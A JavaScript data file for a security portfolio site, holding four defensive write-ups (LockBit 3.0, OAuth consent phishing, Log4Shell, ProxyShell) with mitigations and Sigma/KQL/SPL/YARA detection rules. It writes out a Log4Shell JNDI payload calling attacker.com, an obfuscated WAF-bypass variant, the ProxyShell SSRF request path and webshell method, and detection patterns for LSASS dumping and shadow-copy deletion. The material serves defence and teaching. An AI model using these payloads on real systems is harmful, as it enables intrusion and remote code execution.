// ============================================================
//  blogs.js — SINGLE SOURCE OF TRUTH FOR ALL RESEARCH POSTS
//  Both index.html and research.html load this file.
//  To add a new post: copy the template below and paste it
//  as the FIRST item in the blogs array (so it appears newest).
// ============================================================

// ── HOW TO ADD A NEW POST ───────────────────────────────────
// 1. Copy the template object at the bottom of this file
// 2. Paste it as the first item in the blogs array below
// 3. Fill in all fields
// 4. Save — it will automatically appear in both pages
//    (main portfolio shows latest 3, research.html shows all)
// ───────────────────────────────────────────────────────────

const blogs = [

  // ── POST 1 (FEATURED) ──────────────────────────────────────
  {
    id: 'lockbit',
    url: 'lockbit.html',
    cat: 'ransomware',
    catLabel: 'Ransomware',
    catColor: 'rgba(244,63,94,0.12)',
    catBorder: 'rgba(244,63,94,0.2)',
    catText: '#f43f5e',
    icon: 'fas fa-skull',
    readTime: '8 min',
    title: 'LockBit 3.0: Complete Attack Chain',
    date: 'March 2025',
    featured: true,
    excerpt: 'Double extortion tactics, defense evasion via Terminator driver (BYOVD), lateral movement via PsExec/WMI, and detection rules to catch LockBit affiliates in enterprise environments.',
    mitre: ['T1562.001', 'T1021.002', 'T1486', 'T1070'],
    content: `
      <h2>LockBit 3.0 Ransomware — Deep Dive</h2>
      <p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;March 2025</p>
      <hr>
      <h3>Overview</h3>
      <p>LockBit 3.0, also known as LockBit Black, is the most prolific ransomware-as-a-service (RaaS) operation globally. It introduced a bug bounty program, an encryptor written in C, and the notorious Terminator anti-EDR tool (BYOVD). Targets span healthcare, finance, critical infrastructure, and legal sectors worldwide.</p>
      <h3>Attack Chain</h3>
      <p>Initial Access via RDP brute-force or phishing → Privilege Escalation using UAC bypass → Defense Evasion (Terminator driver kills EDR processes) → Lateral Movement via PsExec and WMI → Data Exfiltration using Mega/rclone → Encryption with .lockbit extension.</p>
      <h3>MITRE ATT&CK Coverage</h3>
      <div class="mitre-grid">
        <span class="mitre-tag">T1562.001 — Disable/Modify Tools</span>
        <span class="mitre-tag">T1021.002 — SMB/Admin Shares</span>
        <span class="mitre-tag">T1486 — Data Encrypted for Impact</span>
        <span class="mitre-tag">T1070 — Indicator Removal</span>
        <span class="mitre-tag">T1059 — Command &amp; Scripting Interpreter</span>
      </div>
      <h3>Vulnerability / Weakness Exploited</h3>
      <p>Exposed RDP (port 3389) with weak or reused credentials. Absence of MFA on administrative accounts. Misconfigured EDR policies allowing kernel driver loading. No network segmentation enabling lateral movement once inside. Backup systems reachable from production network.</p>
      <h3>Methodology (How It Happened)</h3>
      <p>Adversary leverages living-off-the-land binaries: certutil, BITSAdmin, mshta.exe. Disables Windows Defender, SIEM agents, and backup services. Drops Terminator.sys (BYOVD — Bring Your Own Vulnerable Driver) to kill EDR kernel callbacks via IOCTL abuse. Uses LOTL for C2 communication over encrypted channels. Deletes VSS shadow copies with vssadmin before encryption begins.</p>
      <h3>Impact</h3>
      <p>Critical data leakage, prolonged operational downtime, multi-million dollar ransom demands. Double extortion: pay to decrypt AND pay to prevent public leak. Targets healthcare, finance, and energy sectors globally — often causing direct patient safety risks in hospital environments.</p>
      <h3>Mitigation & Hardening</h3>
      <p>Block RDP externally; use VPN + MFA for remote access. Enforce application allowlisting to prevent unauthorized driver loading. Enable Credential Guard and LSA Protection. Store immutable backups offline or in a separate network segment. Monitor for suspicious SMB lateral movement patterns and PsExec usage.</p>
      <h3>Incident Response Actions</h3>
      <p>Immediate containment: isolate affected hosts via MDE or network VLAN change. Revoke compromised credentials and disable affected accounts. Restore from immutable backups offline. Block IOCs (C2 domains, driver hashes), hunt for LOLBin anomalies, check scheduled tasks and services for persistence. Preserve forensic images before remediation.</p>
      <h3>Detection Rules</h3>
      <pre>// Sigma — Suspicious BITSAdmin Transfer
title: BITSAdmin Unusual File Transfer
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\\bitsadmin.exe'
    CommandLine|contains: '/transfer'
  condition: selection
level: high

// KQL — LSASS Dump Detection (Sentinel / MDE)
DeviceProcessEvents
| where ProcessCommandLine contains "comsvcs.dll"
  and ProcessCommandLine contains "MiniDump"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine

// KQL — VSS Shadow Copy Deletion
DeviceProcessEvents
| where ProcessCommandLine has_any ("delete shadows", "resize shadowstorage", "vssadmin delete")
| project Timestamp, DeviceName, InitiatingProcessAccountName, ProcessCommandLine

// SPL — Terminator BYOVD Driver Load
index=wineventlog EventCode=7045
| eval svc=lower(ServiceName)
| where svc="zamguard64" OR svc="zam64"
| table _time, host, ServiceName, ImagePath</pre>
    `
  },

  // ── POST 2 ─────────────────────────────────────────────────
  {
    id: 'oauth',
    cat: 'cloud',
    catLabel: 'Cloud / Identity',
    catColor: 'rgba(59,130,246,0.1)',
    catBorder: 'rgba(59,130,246,0.2)',
    catText: '#3b82f6',
    icon: 'fas fa-cloud',
    readTime: '7 min',
    title: 'OAuth Consent Phishing (APT29 Style)',
    date: 'February 2025',
    featured: false,
    excerpt: 'Abusing OAuth apps for token theft, MFA bypass via device code flow, detection queries against Sentinel, and incident response steps to contain the breach.',
    mitre: ['T1550.001', 'T1111', 'T1114'],
    content: `
      <h2>OAuth Consent Phishing — APT29 Technique</h2>
      <p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;February 2025</p>
      <hr>
      <h3>Overview</h3>
      <p>APT29 (Cozy Bear, Midnight Blizzard) pioneered OAuth consent phishing as a way to gain persistent cloud access without ever touching the victim's password. By abusing legitimate Microsoft OAuth flows, attackers bypass MFA entirely and establish long-lived access to mailboxes, SharePoint, and OneDrive — all without triggering traditional login alerts.</p>
      <h3>Attack Chain</h3>
      <p>Spear-phishing link → rogue OAuth app consent granted by victim → access token + refresh token theft → persistent mailbox access → forwarding rules created → data exfiltrated from SharePoint/OneDrive.</p>
      <h3>MITRE ATT&CK Coverage</h3>
      <div class="mitre-grid">
        <span class="mitre-tag">T1550.001 — Application Access Token</span>
        <span class="mitre-tag">T1111 — MFA Interception</span>
        <span class="mitre-tag">T1114.002 — Remote Email Collection</span>
        <span class="mitre-tag">T1098.003 — Additional Cloud Credentials</span>
      </div>
      <h3>Vulnerability / Weakness Exploited</h3>
      <p>Microsoft's OAuth 2.0 device authorization flow is designed for devices without browsers (smart TVs, CLI tools). Attackers abuse this legitimate flow to generate a user code and poll for tokens once the victim authenticates. MFA is bypassed because the authentication already happened on the victim's own device — the attacker just receives the resulting token.</p>
      <h3>Methodology (How It Happened)</h3>
      <p>Threat actor registers a rogue application in Azure AD — often named something convincing like "Microsoft Teams Update" or "Secure Document Viewer." Sends phishing email with a consent URL. When victim clicks and consents, the attacker's app receives OAuth tokens scoped to mail.read, files.readwrite, and contacts.read. Registers persistent application in victim's Azure AD tenant. Creates inbox forwarding rules to external address for ongoing collection.</p>
      <h3>Impact</h3>
      <p>Full cloud mailbox compromise, stealthy persistence without password reset, data exfiltration from SharePoint and OneDrive without triggering DLP policies. Access persists even after password changes since the OAuth grant remains valid.</p>
      <h3>Mitigation & Hardening</h3>
      <p>Disable user consent for third-party apps (require admin approval). Enforce Conditional Access policies requiring compliant devices. Block legacy authentication protocols. Implement FIDO2 hardware security keys. Conduct quarterly audit of enterprise application permissions in Entra ID. Use Defender for Cloud Apps to detect anomalous OAuth grants.</p>
      <h3>Incident Response Actions</h3>
      <p>Revoke all malicious OAuth grants via Entra portal → Enterprise Applications → review and remove suspicious entries. Revoke all active refresh tokens for affected accounts. Remove suspicious inbox forwarding rules via Exchange Online PowerShell. Audit SharePoint and OneDrive access logs for exfiltration indicators. Review audit logs in Purview for the 30 days prior to discovery.</p>
      <h3>Detection Rules</h3>
      <pre>// KQL — Unusual OAuth Consent Grant (Sentinel)
AADSignInEventsBeta
| where ConsentProvidedForApp == true
| where AppDisplayName !in (known_apps_allowlist)
| where IPAddress !in (corporate_ips)
| project Timestamp, UserPrincipalName, AppDisplayName, IPAddress, Location
| order by Timestamp desc

// KQL — Inbox Rule Created by Non-Owner
OfficeActivity
| where Operation == "New-InboxRule"
| where UserId != MailboxOwnerUPN
| project TimeGenerated, UserId, Parameters

// KQL — Device Code Flow Sign-In Detection
AADSignInEventsBeta
| where AuthenticationProtocol == "deviceCode"
| where IPAddress !in (known_corporate_ips)
| project Timestamp, UserPrincipalName, IPAddress, Location, AppDisplayName

// SPL — Device Code Phishing
index=o365 Operation=UserLoggedIn AuthenticationMethod="DeviceCode"
| stats count by src_user, src_ip, app</pre>
    `
  },

  // ── POST 3 ─────────────────────────────────────────────────
  {
    id: 'log4shell',
    cat: 'cve',
    catLabel: 'CVE / RCE',
    catColor: 'rgba(245,158,11,0.1)',
    catBorder: 'rgba(245,158,11,0.2)',
    catText: '#f59e0b',
    icon: 'fas fa-bug',
    readTime: '9 min',
    title: 'Log4Shell (CVE-2021-44228) Methodology & IR',
    date: 'January 2025',
    featured: false,
    excerpt: 'JNDI injection deep-dive, post-exploitation techniques via LDAP/RMI class loading, YARA rules, and a full containment playbook for Blue Teams.',
    mitre: ['T1190', 'T1059', 'T1105'],
    content: `
      <h2>Log4Shell — JNDI Injection &amp; Full Exploitation Chain</h2>
      <p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;January 2025</p>
      <hr>
      <h3>Overview</h3>
      <p>Log4Shell (CVE-2021-44228) is arguably the most impactful vulnerability of the last decade. A zero-day in Apache Log4j2, a ubiquitous Java logging library, allowed unauthenticated remote code execution simply by logging a crafted string. CVSS score: 10.0 Critical. Affected billions of devices across cloud infrastructure, enterprise software, and consumer products.</p>
      <h3>Attack Chain</h3>
      <p>Adversary injects <code style="background:rgba(0,255,229,0.07);padding:2px 6px;border-radius:4px;font-family:var(--mono);font-size:11px">\${jndi:ldap://attacker.com/x}</code> into HTTP headers (User-Agent, X-Forwarded-For, X-Api-Version). Vulnerable log4j2 performs remote lookup → LDAP redirects to attacker RMI server → remote class loading → RCE on target JVM.</p>
      <h3>MITRE ATT&CK Coverage</h3>
      <div class="mitre-grid">
        <span class="mitre-tag">T1190 — Exploit Public-Facing Application</span>
        <span class="mitre-tag">T1059.007 — JavaScript/JScript</span>
        <span class="mitre-tag">T1105 — Ingress Tool Transfer</span>
        <span class="mitre-tag">T1071 — Application Layer Protocol</span>
      </div>
      <h3>Vulnerability / Weakness Exploited</h3>
      <p>Log4j2's message lookup substitution feature — enabled by default — caused the library to process special syntax in logged strings and perform outbound network requests. The library trusted user-controlled input and made JNDI lookups to attacker-controlled servers, enabling remote class loading and arbitrary code execution within the JVM process context.</p>
      <h3>Methodology (How It Happened)</h3>
      <p>Attack payloads were injected into virtually any logged field: HTTP headers, form fields, usernames, search queries. Obfuscation techniques emerged rapidly: nested lookups like <code style="background:rgba(0,255,229,0.07);padding:2px 6px;border-radius:4px;font-family:var(--mono);font-size:11px">\${j\${::-n}di:...}</code> to bypass initial WAF rules. The exploit required no authentication, no user interaction, and worked against any internet-facing Java application using Log4j 2.0-beta9 through 2.14.1.</p>
      <h3>Impact</h3>
      <p>Crypto miner deployment, reverse shell via Netcat/Cobalt Strike beacon, pivoting to internal cloud metadata service (AWS IMDS), credential harvesting from JVM heap dumps. Nation-state actors, ransomware groups, and script kiddies all exploited this within 24 hours of disclosure.</p>
      <h3>Mitigation & Hardening</h3>
      <p>Patch to log4j2 ≥2.17.1 immediately. Interim mitigations: set JVM flag <code style="background:rgba(0,255,229,0.07);padding:2px 6px;border-radius:4px;font-family:var(--mono);font-size:11px">-Dlog4j2.formatMsgNoLookups=true</code>. Remove JndiLookup.class from all jar files. Deploy WAF rules blocking \${jndi: patterns. Block outbound LDAP/RMI at the network perimeter. Maintain a software bill of materials (SBOM) to identify all log4j dependencies.</p>
      <h3>Incident Response Actions</h3>
      <p>Hunt for DNS callouts to unknown LDAP/RMI endpoints in DNS logs. Identify all Java applications in the environment and check log4j version. Check for new scheduled tasks, services, or cron jobs created post-exploitation. Hunt for unusual outbound connections from Java processes. Preserve logs from application servers for forensic analysis.</p>
      <h3>Detection Rules</h3>
      <pre># YARA — Log4Shell Exploitation Attempt
rule Log4j_JNDI_Exploit {
  meta:
    description = "Detects Log4Shell exploitation in HTTP logs"
    severity = "CRITICAL"
  strings:
    $a = /\$\{jndi:(ldap|rmi|dns|iiop|corba|nds):\/\// nocase
    $b = "\${lower:" nocase
    $c = "\${upper:" nocase
  condition:
    $a or ($b and $c)
}

// Splunk — Hunt for JNDI probe in proxy logs
index=proxy sourcetype=access_combined
(uri_query="*jndi:ldap*" OR cs_uri_query="*jndi:rmi*"
 OR cs_referer="*jndi:dns*")
| stats count by src_ip, dest, cs_uri_query, _time
| sort -count

// KQL — Unusual Java process outbound DNS
DeviceNetworkEvents
| where InitiatingProcessFileName == "java.exe"
| where RemotePort in (389, 1099, 1389)
| project Timestamp, DeviceName, RemoteIP, RemotePort, InitiatingProcessCommandLine</pre>
    `
  },

  // ── POST 4 ─────────────────────────────────────────────────
  {
    id: 'proxyshell',
    cat: 'exchange',
    catLabel: 'Exchange / RCE',
    catColor: 'rgba(0,255,229,0.07)',
    catBorder: 'rgba(0,255,229,0.15)',
    catText: '#00ffe5',
    icon: 'fas fa-server',
    readTime: '6 min',
    title: 'ProxyShell: Exchange Pre-Auth RCE Chain',
    date: 'December 2024',
    featured: false,
    excerpt: 'SSRF to PowerShell remoting to webshell deployment — three CVEs chained together for full Exchange compromise and lateral movement to domain controllers.',
    mitre: ['T1190', 'T1059.001', 'T1505.003'],
    content: `
      <h2>ProxyShell — Microsoft Exchange RCE Chain</h2>
      <p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;December 2024</p>
      <hr>
      <h3>Overview</h3>
      <p>ProxyShell is a chain of three vulnerabilities in Microsoft Exchange Server that, when combined, allow unauthenticated remote code execution. Discovered by Orange Tsai and presented at Pwn2Own 2021 and Black Hat USA 2021. Widely exploited within days of public disclosure by ransomware groups including Conti, BlackByte, and LockBit affiliates.</p>
      <h3>CVE Chain</h3>
      <p>CVE-2021-34473 (SSRF / auth bypass) → CVE-2021-34523 (PowerShell remoting privilege escalation) → CVE-2021-31207 (write arbitrary webshell via mailbox export).</p>
      <h3>MITRE ATT&CK Coverage</h3>
      <div class="mitre-grid">
        <span class="mitre-tag">T1190 — Exploit Public-Facing App</span>
        <span class="mitre-tag">T1059.001 — PowerShell</span>
        <span class="mitre-tag">T1505.003 — Web Shell</span>
        <span class="mitre-tag">T1021.006 — WinRM</span>
      </div>
      <h3>Vulnerability / Weakness Exploited</h3>
      <p>The SSRF vulnerability (CVE-2021-34473) allowed an attacker to access the Exchange backend as NT AUTHORITY\SYSTEM by manipulating the URL path to include an email address. Combined with an Exchange PowerShell remoting privilege confusion bug, attackers could run Exchange management cmdlets as SYSTEM. The mailbox export feature then provided a file write primitive to place a webshell anywhere on the filesystem.</p>
      <h3>Methodology (How It Happened)</h3>
      <p>Attacker sends malicious POST to <code style="background:rgba(0,255,229,0.07);padding:2px 6px;border-radius:4px;font-family:var(--mono);font-size:11px">/autodiscover/autodiscover.json?Email=autodiscover/autodiscover.json%3F@victim.com</code> to bypass auth as SYSTEM. Then uses Exchange Management PowerShell to schedule a mailbox export (New-MailboxExportRequest) targeting an .aspx path in the web root, deploying a webshell in /aspnet_client/. Webshell then provides persistent, authenticated RCE.</p>
      <h3>Impact</h3>
      <p>Full Exchange server compromise, persistent webshell access, mailbox data theft, lateral movement to domain controllers. Widely exploited by ransomware groups and nation-state actors. Once webshell is deployed, attackers typically dump LSASS, harvest domain credentials, and move laterally within hours.</p>
      <h3>Mitigation & Hardening</h3>
      <p>Apply latest Exchange Cumulative Update (CU) immediately. Remove all .asp/.aspx/.ashx files from /aspnet_client/ and /OWA/ directories. Reset IIS application pools. Block external access to /autodiscover/ path at WAF/perimeter. Disable PowerShell remoting on Exchange servers where not required.</p>
      <h3>Incident Response Actions</h3>
      <p>Audit IIS logs for suspicious autodiscover requests containing @ in the query string. Check for New-MailboxExportRequest entries in Exchange audit logs. Remove any .aspx files from /aspnet_client/ directory. Reset IIS app pools. Revoke all PendingRequests in EMS. Conduct full credential reset for all accounts with mailboxes on affected server.</p>
      <h3>Detection Rules</h3>
      <pre>// Sigma — ProxyShell Autodiscover Abuse
title: ProxyShell Exploitation Attempt
logsource:
  product: iis
detection:
  selection:
    cs-method: POST
    cs-uri-stem|contains:
      - '/autodiscover/autodiscover.json'
      - '/autodiscover/autodiscover.xml'
    cs-uri-query|contains: '@'
  condition: selection
level: critical

// KQL — Mailbox Export to Webshell Path (Sentinel)
SecurityEvent
| where EventID == 4104
| where ScriptBlockText contains "New-MailboxExportRequest"
  and ScriptBlockText contains "aspnet_client"
| project TimeGenerated, Computer, SubjectUserName, ScriptBlockText

// KQL — New File in Exchange Web Directories
DeviceFileEvents
| where FolderPath has_any ("aspnet_client", "owa", "ecp")
| where FileName endswith ".aspx" or FileName endswith ".ashx"
| where ActionType == "FileCreated"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessAccountName</pre>
    `
  },

  // ── ADD NEW POSTS ABOVE THIS LINE ──────────────────────────
  // To add a new post, copy the template below and paste it
  // above this comment as the first item in the array.
  // ───────────────────────────────────────────────────────────

];

// ============================================================
//  NEW POST TEMPLATE — Copy this, paste above, fill it in
// ============================================================
//
// {
//   id: 'unique-slug',               // e.g. 'blackcat-ransomware'
//   cat: 'ransomware',               // ransomware | cloud | cve | exchange | threat-actor | detection | blueteam
//   catLabel: 'Ransomware',          // Display label shown on card
//   catColor: 'rgba(244,63,94,0.12)',
//   catBorder: 'rgba(244,63,94,0.2)',
//   catText: '#f43f5e',
//   // Color options:
//   //   Red   (ransomware/cve):   rgba(244,63,94,...)   #f43f5e
//   //   Blue  (cloud/identity):   rgba(59,130,246,...)  #3b82f6
//   //   Amber (threat actor):     rgba(245,158,11,...)  #f59e0b
//   //   Cyan  (exchange/blue):    rgba(0,255,229,...)   #00ffe5
//   //   Green (detection eng):    rgba(34,197,94,...)   #22c55e
//   icon: 'fas fa-skull',            // FontAwesome icon class
//   readTime: '10 min',
//   title: 'Your Post Title Here',
//   date: 'April 2025',
//   featured: false,                 // Set true for ONE post only (shows large on research.html)
//   excerpt: 'Two-line summary shown on the card preview.',
//   mitre: ['T1486', 'T1562.001'],   // MITRE technique IDs shown as tags
//   content: `
//     <h2>Your Full Title</h2>
//     <p class="modal-date"><i class="fas fa-calendar-alt"></i> &nbsp;April 2025</p>
//     <hr>
//     <h3>Overview</h3>
//     <p>What happened, who was targeted, why it matters.</p>
//
//     <h3>Attack Chain</h3>
//     <p>Step 1 → Step 2 → Step 3 → Impact.</p>
//
//     <h3>MITRE ATT&CK Coverage</h3>
//     <div class="mitre-grid">
//       <span class="mitre-tag">T1190 — Exploit Public-Facing Application</span>
//     </div>
//
//     <h3>Vulnerability / Weakness Exploited</h3>
//     <p>Root cause — misconfiguration, unpatched CVE, weak creds, etc.</p>
//
//     <h3>Methodology (How It Happened)</h3>
//     <p>Technical deep-dive of the attacker's steps.</p>
//
//     <h3>Impact</h3>
//     <p>What was compromised, exfiltrated, disrupted.</p>
//
//     <h3>Mitigation & Hardening</h3>
//     <p>Preventive controls, patches, config changes.</p>
//
//     <h3>Incident Response Actions</h3>
//     <p>Containment → Eradication → Recovery steps.</p>
//
//     <h3>Detection Rules</h3>
//     <pre>// KQL / Sigma / SPL — optional</pre>
//   `
// },
